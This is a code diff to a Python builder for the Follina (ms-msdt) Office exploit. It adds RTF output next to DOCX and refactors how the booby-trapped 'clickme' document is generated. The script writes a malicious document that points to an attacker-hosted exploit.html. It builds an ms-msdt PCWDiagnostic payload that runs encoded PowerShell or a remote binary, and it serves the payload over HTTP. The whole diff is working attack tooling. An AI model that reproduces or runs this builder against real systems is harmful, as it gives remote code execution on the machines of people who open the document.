@@ -6,6 +6,13 @@ import http.server
 import socketserver
 import base64
 
+const_src_path = "src"
+const_src_docx_path = f"{const_src_path}/clickme"
+const_rtf_payload = "XpayloadX"
+const_docx_name = "clickme.docx"
+const_rtf_name = "clickme.rtf"
+const_rtf_template_path = "src/rtf/clickme.rtf"
+
 # Helper function to zip whole dir
 # https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory
 def zipdir(path, ziph):
@@ -18,6 +25,34 @@ def zipdir(path, ziph):
                             path
                        ))
 
+def generate_docx(param_payload_url):
+    with open(f"{const_src_path}/document.xml.rels.tpl", "r") as f:
+        tmp = f.read()
+
+    payload_rels = tmp.format(payload_url = param_payload_url)
+
+    if not os.path.exists(f"{const_src_docx_path}/word/_rels"):
+        os.makedirs(f"{const_src_docx_path}/word/_rels")
+
+    with open(f"{const_src_docx_path}/word/_rels/document.xml.rels", "w") as f:
+        f.write(payload_rels)
+
+    with zipfile.ZipFile(const_docx_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        zipdir(const_src_docx_path, zipf)
+
+    print(f"Generated {const_docx_name} in current directory")
+
+def generate_rtf(param_payload_url):
+    with open(const_rtf_template_path, "r") as f:
+        tmp = f.read()
+
+    payload_rtf = tmp.replace(const_rtf_payload, param_payload_url)
+
+    with open(const_rtf_name, "w") as f:
+        f.write(payload_rtf)
+
+    print(f"Generated {const_rtf_name} in current directory")    
+
 if __name__ == "__main__":
 
     # Parse arguments
@@ -26,6 +61,8 @@ if __name__ == "__main__":
     binary = parser.add_argument_group('Binary Execution Arguments')
     command = parser.add_argument_group('Command Execution Arguments')
     optional = parser.add_argument_group('Optional Arguments')
+    required.add_argument('-t', '--type', action='store', dest='type', choices={"docx", "rtf"},
+        help='Choose type of payload (RTF, DOCX)', required=True)
     required.add_argument('-m', '--mode', action='store', dest='mode', choices={"binary", "command"},
         help='Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command', required=True)
     binary.add_argument('-b', '--binary', action='store', dest='binary', 
@@ -40,14 +77,13 @@ if __name__ == "__main__":
         help='The port to run the HTTP server on, defaults to 80')
     args = parser.parse_args()
 
+    payload_url = f"http://{args.url}:{args.port}/exploit.html"
+
     if args.mode == "binary" and args.binary is None:
         raise SystemExit("Binary mode requires a binary to be specified, e.g. -b '\\\\localhost\\c$\\Windows\\System32\\calc.exe'")
 
-
     if args.mode == "command" and args.command is None:
         raise SystemExit("Command mode requires a command to be specified, e.g. -c 'c:\\windows\\system32\\cmd.exe /c whoami > c:\\users\\public\\pwned.txt'")
-
-    payload_url = f"http://{args.url}:{args.port}/exploit.html"
 
     if args.mode == "command":
         # Original PowerShell execution variant
@@ -61,22 +97,11 @@ if __name__ == "__main__":
         payload = fr'"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$({binary_path})/.exe\""'
 
     # Prepare the doc file
-    with open("src/document.xml.rels.tpl", "r") as f:
-        tmp = f.read()
+    if args.type == "docx":
+        generate_docx(payload_url)
 
-    payload_rels = tmp.format(payload_url = payload_url)
-
-    if not os.path.exists("src/clickme/word/_rels"):
-        os.makedirs("src/clickme/word/_rels")
-
-    with open("src/clickme/word/_rels/document.xml.rels", "w") as f:
-        f.write(payload_rels)
-
-    with zipfile.ZipFile('clickme.docx', 'w', zipfile.ZIP_DEFLATED) as zipf:
-        zipdir('src/clickme/', zipf)
-
-    print("Generated 'clickme.docx' in current directory")
-
+    if args.type == "rtf":
+        generate_rtf(payload_url)
 
     # Prepare the HTML payload
     if not os.path.exists("www"):
@@ -91,7 +116,6 @@ if __name__ == "__main__":
         f.write(payload_html)
 
     print("Generated 'exploit.html' in 'www' directory")
-
 
     # Host the payload
     class Handler(http.server.SimpleHTTPRequestHandler):
